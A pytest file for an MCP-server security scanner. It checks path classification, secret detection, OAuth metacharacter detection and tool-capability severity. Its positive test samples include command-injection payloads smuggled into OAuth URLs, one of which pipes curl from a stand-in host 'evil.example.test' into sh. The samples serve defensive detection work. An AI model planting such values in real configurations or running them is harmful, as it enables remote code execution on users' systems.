"""
Phase 5 / Part 1 — false-positive fixes found by the Phase 4 final rescan.

Shapes are copied from the registry repositories that produced the false positives;
no repository content is reproduced.
"""

import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from app.analysis.mcp_top10_detectors import detect_hardcoded_secrets, is_non_production_path  # noqa: E402
from app.models.schemas import FindingSeverity  # noqa: E402


def _write(root, rel, text):
    path = root.joinpath(*rel.split("/"))
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


# A key-shaped value assembled at run time so this file never holds one.
FAKE_SK = "sk-" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4"


class TestNonProductionPath:
    @pytest.mark.parametrize("rel", [
        "tests/test_auth.py", "test/unit.js", "src/__tests__/a.ts", "fixtures/server.json",
        "examples/basic/server.py", "docs/guide/config.json", "e2e/login.ts",
        "extensions/connector/smoke/stored-sessions.smoke.ts", "smoke/run.ts",
        "scripts/generate_report_screenshot.py", "bench/load.py", "benchmarks/run.py",
        "demo/server.py", "demos/a/server.py", ".github/workflows/test-action.yml",
        "src/session.smoke.ts", "src/auth.test.ts", "src/auth.spec.js", "pkg/auth_test.py",
        "pkg/test_auth.py", "extensions\\connector\\smoke\\a.ts", ".github\\workflows\\ci.yml",
    ])
    def test_non_production(self, rel):
        assert is_non_production_path(rel)

    @pytest.mark.parametrize("rel", [
        "src/server.py", "server.ts", "app/auth/oauth.py", "latest/server.py", "src/contest.py",
        "src/attestation.ts", "src/smoketest_runner.py", "src/benchmark_tool.py",
        "mcpsecbench/server.py", "src/description.ts", "lib/documents.py", "src/scripted.ts",
    ])
    def test_production(self, rel):
        assert not is_non_production_path(rel)

    def test_secret_in_smoke_scripts_and_ci_paths_is_low(self, tmp_path):
        for rel in ("ext/smoke/stored.smoke.ts", "scripts/shot.py", ".github/workflows/ci.yml", "demo/run.py"):
            _write(tmp_path, rel, f'key = "{FAKE_SK}"\n')
        found = detect_hardcoded_secrets(str(tmp_path))
        assert len(found) == 4
        assert all(f.severity == FindingSeverity.LOW for f in found)

    def test_secret_in_production_path_keeps_its_severity(self, tmp_path):
        _write(tmp_path, "src/server.py", f'key = "{FAKE_SK}"\n')
        found = detect_hardcoded_secrets(str(tmp_path))
        assert [f.severity for f in found] == [FindingSeverity.CRITICAL]


from app.analysis.tool_body_detectors import detect_oauth_metacharacters  # noqa: E402

# The shapes that produced 21 CRITICAL false positives on one registry repository:
# ordinary issuer / endpoint assignments followed by more code on the line or the next.
OAUTH_NEGATIVES = [
    'const issuer = "http://127.0.0.1:9";\nconst port = 9;\n',
    '    const issuer = "https://auth.example.test";\n    const key = await generateSigningKey();\n',
    'const tokens = createUserTokenIssuer({ issuer: "https://auth.example.test", key: await generateSigningKey() });\n',
    '      if (claims.issuer === "https://auth.example.test" && claims.sub) { ok = true; }\n',
    '    let issuer = "https://auth.example.test"; let audience = "mcp";\n',
    '  async function mint() { const issuer = "https://auth.example.test"; return sign(issuer); }\n',
    'const cfg = { issuer: "local-dev", audience: "mcp" }; const next = cfg || fallback;\n',
    'issuer = "internal"; import os\n',
    'const redirect_uri = "http://localhost:3000/callback"; const state = a || b;\n',
    'token_endpoint: `${base}/oauth/token`, authorization_endpoint: `${base}/authorize`,\n',
    'const token_url = "https://auth.example.test/token?a=1;b=2";\n',
    '// issuer: see https://auth.example.test/.well-known/openid-configuration; then cache it\n',
]

OAUTH_POSITIVES = [
    'authorization_url = AnyHttpUrl("http://user$(mate-calc)r:pass@127.0.0.1:9003/authorize?response_type=code")\n',
    'authorization_endpoint: "http://127.0.0.1:9003/authorize?x=$(touch /tmp/pwned)",\n',
    '{"issuer": "https://auth.example.test", "token_endpoint": "https://auth.example.test/token&&calc"}\n',
    'const token_url = "http://a.example.test/t; curl evil.example.test | sh";\n',
    'registration_endpoint = "http://a.example.test/reg${IFS}&&id"\n',
]


class TestOauthMetacharValueOnly:
    @pytest.mark.parametrize("src", OAUTH_NEGATIVES)
    def test_metacharacters_outside_the_url_value_do_not_match(self, tmp_path, src):
        _write(tmp_path, "src/auth.ts", src)
        assert detect_oauth_metacharacters(str(tmp_path)) == []

    @pytest.mark.parametrize("src", OAUTH_POSITIVES)
    def test_metacharacters_inside_the_url_value_match(self, tmp_path, src):
        _write(tmp_path, "src/auth.py", "x = 1\n" + src)
        found = detect_oauth_metacharacters(str(tmp_path))
        assert len(found) == 1
        assert found[0].severity == FindingSeverity.CRITICAL and found[0].line_number == 2

    def test_no_benchmark_name_in_the_rule(self, tmp_path):
        # the path decides, and no benchmark is special-cased: the same file is reported
        # under a production path and skipped under tests/, whatever the directory is called
        _write(tmp_path, "mcpsecbench/server/auth.py", OAUTH_POSITIVES[0])
        _write(tmp_path, "mcpsecbench/smoke/auth.py", OAUTH_POSITIVES[0])
        found = detect_oauth_metacharacters(str(tmp_path))
        assert [f.file_path.replace("\\", "/") for f in found] == ["mcpsecbench/server/auth.py"]
        app_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "app")
        for root, _dirs, files in os.walk(app_dir):
            for name in files:
                if name.endswith(".py"):
                    with open(os.path.join(root, name), encoding="utf-8") as fh:
                        assert "mcpsecbench" not in fh.read().lower(), name


# Key-shaped values, assembled at run time so this file never holds one.
AWS_DOC_KEY = "AKIA" + "IOSFODNN7" + "EXAMPLE"          # AWS's documented sample id
AWS_DOC_KEY_2 = "AKIA" + "Z9Y8X7W6V" + "EXAMPLE"        # same convention, not in any allowlist
AWS_LIVE_SHAPE = "AKIA" + "Q7RT2MXL9PZ4" + "WK3V"
PEM_HEADER = "-----BEGIN " + "PRIVATE KEY-----"
PEM_BODY = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj"


def _secrets(tmp_path, text, rel="src/server.ts"):
    _write(tmp_path, rel, text)
    return detect_hardcoded_secrets(str(tmp_path))


class TestSecretShapedLiterals:
    @pytest.mark.parametrize("text", [
        f'ROWS = [{{"access_key": "{AWS_DOC_KEY}"}}]\n',
        f'sample_key_id = "{AWS_DOC_KEY_2}"\n',
        f'log("using key {FAKE_SK[:8]}***")\n',
        f'const shown = "{FAKE_SK}***";\n',
    ])
    def test_documented_examples_and_masked_values_are_placeholders(self, tmp_path, text):
        assert _secrets(tmp_path, text) == []

    @pytest.mark.parametrize("text", [
        f'const PEM_MARKER = "{PEM_HEADER}";\n',
        f'  {{ pattern: /{PEM_HEADER}[\\s\\S]+?-----END/g, replacement: "[REDACTED PRIVATE KEY]" }},\n',
        f'if (text.includes("{PEM_HEADER}")) {{\n  return "[private key removed]";\n}}\n',
    ])
    def test_pem_header_without_a_key_body_is_not_a_secret(self, tmp_path, text):
        assert _secrets(tmp_path, text) == []

    @pytest.mark.parametrize("text", [
        f'const KEY = `{PEM_HEADER}\n{PEM_BODY}\n{PEM_BODY}\n-----END PRIVATE KEY-----`;\n',
        f'KEY = "{PEM_HEADER}\\n{PEM_BODY}\\n-----END PRIVATE KEY-----"\n',
        f'KEY = "{PEM_HEADER}\\n" +\n  "{PEM_BODY}\\n"\n',
    ])
    def test_pem_header_with_a_key_body_is_critical(self, tmp_path, text):
        found = _secrets(tmp_path, text)
        assert [f.severity for f in found] == [FindingSeverity.CRITICAL]
        assert found[0].line_number == 1

    @pytest.mark.parametrize("text", [
        f'assert.equal(redactSecrets("token {FAKE_SK} end"), "token [REDACTED] end");\n',
        f'const out = maskApiKey("{FAKE_SK}");\n',
        f'  {{ pattern: KEY_RE, replacement: "{FAKE_SK}" }},\n',
        f"          API_KEY: ${{{{ secrets.PROVIDER_API_KEY || '{FAKE_SK}' }}}}\n",
        f'api_key = scrub("{FAKE_SK}")\n',
    ])
    def test_redaction_arguments_and_ci_fallbacks_are_skipped(self, tmp_path, text):
        assert _secrets(tmp_path, text) == []

    @pytest.mark.parametrize("text,severity", [
        (f'const client = new Client("{FAKE_SK}");\n', FindingSeverity.CRITICAL),
        (f'AWS_ACCESS_KEY_ID = "{AWS_LIVE_SHAPE}"\n', FindingSeverity.CRITICAL),
        (f'redact(input); const key = "{FAKE_SK}";\n', FindingSeverity.CRITICAL),
        (f'api_key = "{FAKE_SK[3:]}"\n', FindingSeverity.HIGH),
    ])
    def test_real_shapes_still_fire(self, tmp_path, text, severity):
        assert [f.severity for f in _secrets(tmp_path, text)] == [severity]


from app.analysis.owasp_mapping import (  # noqa: E402
    dangerous_tool_map, detect_dangerous_tool_capabilities, detect_toxic_tool_combos,
)
from app.models.schemas import MCPToolDefinition  # noqa: E402


def _tool(name, desc, props=None):
    return MCPToolDefinition(name=name, description=desc,
                             input_schema={"type": "object", "properties": props or {}})


def _caps(*tools):
    return {f.id: f for f in detect_dangerous_tool_capabilities(list(tools))}


class TestShellExecNameAlone:
    def test_spawn_prefix_with_a_wrapper_args_object_is_not_critical(self):
        # the registry shape: spawn_subagent(args: object), nothing about a shell
        tools = [
            _tool("spawn_subagent", "Spawn a single sub-agent to execute a task.\n\nThis creates an isolated "
                  "agent instance that can work independently on a specific task and return summarized results.",
                  {"args": {"type": "object"}}),
            _tool("spawn_parallel_subagents", "Spawn multiple sub-agents to execute tasks in parallel.",
                  {"args": {"type": "object"}}),
        ]
        found = _caps(*tools)
        assert found["cap_spawn_subagent_shell_exec"].severity == FindingSeverity.LOW
        assert found["cap_spawn_parallel_subagents_shell_exec"].severity == FindingSeverity.LOW
        assert dangerous_tool_map(tools) == {}

    @pytest.mark.parametrize("name,desc,props", [
        ("execute_query", "Execute a read-only SQL query against the analytics database.", {"code": {"type": "string"}}),
        ("system_status", "Report uptime and version.", {}),
        ("eval_metrics", "Compute evaluation metrics for a run.", {"args": {"type": "object"}}),
    ])
    def test_weak_name_tokens_alone_stay_low(self, name, desc, props):
        assert _caps(_tool(name, desc, props))[f"cap_{name}_shell_exec"].severity == FindingSeverity.LOW

    @pytest.mark.parametrize("name,desc,props,severity", [
        # a parameter that can only carry a command confirms the name
        ("spawn_process", "Start a child process.", {"command": {"type": "string"}}, FindingSeverity.CRITICAL),
        ("exec", "", {"cmd": {"type": "string"}}, FindingSeverity.CRITICAL),
        # the description confirms it
        ("spawn_worker", "Runs a shell command in a new worker.", {"args": {"type": "array"}}, FindingSeverity.CRITICAL),
        ("__admin_exec", "Run an administrative command.", {}, FindingSeverity.HIGH),
        # names that only mean a shell are not weakened
        ("run_command", "", {"args": {"type": "array"}}, FindingSeverity.CRITICAL),
        ("bash", "", {}, FindingSeverity.HIGH),
        ("run_macro", 'Run a macro against the browser tab. Three forms: pass "macro" to open and run that '
                      'stored macro; pass "script" (inline JavaScript) to run code directly.',
         {"macro": {"type": "string"}, "script": {"type": "string"}}, FindingSeverity.CRITICAL),
    ])
    def test_confirmed_shell_tools_keep_their_severity(self, name, desc, props, severity):
        assert _caps(_tool(name, desc, props))[f"cap_{name}_shell_exec"].severity == severity


class TestManifestEncoding:
    def test_utf8_manifests_do_not_crash_on_a_non_utf8_platform_default(self, tmp_path):
        # Found on the fresh registry sample: a package.json with non-ASCII text was read with
        # the platform code page (cp1252 on Windows) and the scan died with UnicodeDecodeError.
        from app.analysis.engine import MCPAnalysisEngine
        (tmp_path / "package.json").write_bytes(
            '{"name": "배새", "description": "café \u0081 — 서버", '
            '"scripts": {"postinstall": "node build.js"}}'.encode("utf-8"))
        (tmp_path / "pyproject.toml").write_bytes('[project]\nname = "배새"\ndescription = "café \u0081"\n'.encode("utf-8"))
        findings = MCPAnalysisEngine()._analyze_manifests(str(tmp_path))
        assert any(f.id == "manifest_postinstall" for f in findings)

    def test_manifest_with_a_bom_is_parsed(self, tmp_path):
        from app.analysis.engine import MCPAnalysisEngine
        (tmp_path / "package.json").write_bytes(b"\xef\xbb\xbf" + b'{"scripts": {"preinstall": "node x.js"}}')
        findings = MCPAnalysisEngine()._analyze_manifests(str(tmp_path))
        assert any(f.id == "manifest_preinstall" for f in findings)


class TestComboNeverOutranksItsWeakerInput:
    def test_critical_shell_plus_scoped_delete_is_medium(self):
        # the registry shape: run_macro (CRITICAL, by design) + delete_macro (LOW, scoped to one folder)
        tools = [
            _tool("run_macro", 'Run a macro. Pass "script" (inline JavaScript) to run code directly.',
                  {"macro": {"type": "string"}, "script": {"type": "string"}}),
            _tool("delete_macro", 'Delete a macro from the "AI Generated" folder. Only macros inside '
                  '"AI Generated" can be deleted; everything else is refused.', {"name": {"type": "string"}}),
        ]
        caps = _caps(*tools)
        assert caps["cap_run_macro_shell_exec"].severity == FindingSeverity.CRITICAL
        assert caps["cap_delete_macro_file_write"].severity == FindingSeverity.LOW
        combos = {f.id: f for f in detect_toxic_tool_combos(tools)}
        assert combos["toxic_combo_code_execute_filesystem"].severity == FindingSeverity.MEDIUM

    def test_critical_shell_plus_unrestricted_files_is_still_critical(self):
        tools = [
            _tool("run_command", "Run a shell command on the host and return its output.", {"cmd": {"type": "string"}}),
            _tool("read_file", "Read any file on disk by absolute or relative path.", {"path": {"type": "string"}}),
        ]
        combos = {f.id: f for f in detect_toxic_tool_combos(tools)}
        assert combos["toxic_combo_code_execute_filesystem"].severity == FindingSeverity.CRITICAL

    def test_name_only_guess_does_not_make_a_critical_combination(self):
        tools = [
            _tool("spawn_subagent", "Spawn a single sub-agent to execute a task.", {"args": {"type": "object"}}),
            _tool("read_file", "Read any file on disk by absolute or relative path.", {"path": {"type": "string"}}),
        ]
        for f in detect_toxic_tool_combos(tools):
            assert f.severity in (FindingSeverity.LOW, FindingSeverity.MEDIUM), f.id
